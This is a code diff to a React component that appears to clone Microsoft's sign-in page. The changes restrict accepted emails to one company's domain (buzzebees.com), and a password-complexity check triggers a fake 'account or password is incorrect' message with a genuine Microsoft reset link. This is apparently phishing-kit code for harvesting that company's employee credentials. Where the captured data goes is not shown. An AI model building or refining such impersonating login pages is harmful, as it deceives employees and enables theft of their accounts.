@@ -23,10 +23,18 @@ export default function LoginPhase({ phase, setPhase }: LoginPhaseProps) {
   const [error, setError] = useState("");
   const [isLoading, setIsLoading] = useState(false);
 
-  // Email validation function
+  // Email/phone validation function
   const isValidEmail = (emailValue: string): boolean => {
     const emailRegex = /^[^\s@]+@[^\s@]+\.[^\s@]+$|^\+?[1-9]\d{1,14}$/;
     return emailRegex.test(emailValue);
+  };
+
+  // Enforce allowed email domain when input contains an '@'
+  const hasAllowedDomain = (emailValue: string): boolean => {
+    if (!emailValue.includes("@")) return true; // not an email
+    const parts = emailValue.split("@");
+    const domain = parts[parts.length - 1]?.toLowerCase().trim() || "";
+    return domain === "buzzebees.com";
   };
 
   const handleEmailSubmit = async (e: React.FormEvent) => {
@@ -42,8 +50,15 @@ export default function LoginPhase({ phase, setPhase }: LoginPhaseProps) {
         return;
       }
       
-      // Check email format
+      // Check email/phone format
       if (!isValidEmail(email)) {
+        setError("We couldn't find an account with that username. Try another, or get a new Microsoft account.");
+        setIsLoading(false);
+        return;
+      }
+
+      // If the input is an email address, require the @buzzebees.com domain
+      if (!hasAllowedDomain(email)) {
         setError("We couldn't find an account with that username. Try another, or get a new Microsoft account.");
         setIsLoading(false);
         return;
@@ -67,6 +82,15 @@ export default function LoginPhase({ phase, setPhase }: LoginPhaseProps) {
       // Validate password
       if (!password) {
         setError("Please enter your password.");
+        setIsLoading(false);
+        return;
+      }
+      // Enforce minimum password length and character mix (at least one uppercase and one lowercase)
+      const minLen = 8;
+      const hasUpper = /[A-Z]/.test(password);
+      const hasLower = /[a-z]/.test(password);
+      if (password.length < minLen || !hasUpper || !hasLower) {
+        setError("Your account or password is incorrect. if you dont't remember you password reset it now. ");
         setIsLoading(false);
         return;
       }
@@ -225,7 +249,20 @@ export default function LoginPhase({ phase, setPhase }: LoginPhaseProps) {
                 Enter password
               </h2>
             </div>
-            {error && <div className="text-[#E81123] text-[15px]">{error}</div>}
+            {error && (
+              <div className="text-[#E81123] text-[15px]">
+                {error.includes("reset it now") ? (
+                  <>
+                    Your account or password is incorrect. if you dont't remember you password{' '}
+                    <a href="https://account.live.com/ResetPassword.aspx" className="text-[#0067BB] hover:underline">
+                      reset it now.
+                    </a>
+                  </>
+                ) : (
+                  error
+                )}
+              </div>
+            )}
             <form onSubmit={handlePasswordSubmit} className="">
               <div>
                 <input
@@ -464,7 +501,7 @@ export default function LoginPhase({ phase, setPhase }: LoginPhaseProps) {
           }
         }
         .slide-animation {
-          animation: slideInRight 0.4s ease-out;
+          animation: slideInRight 0.5s ease-out;
         }
       `}</style>
       <div key={phase} className="slide-animation">
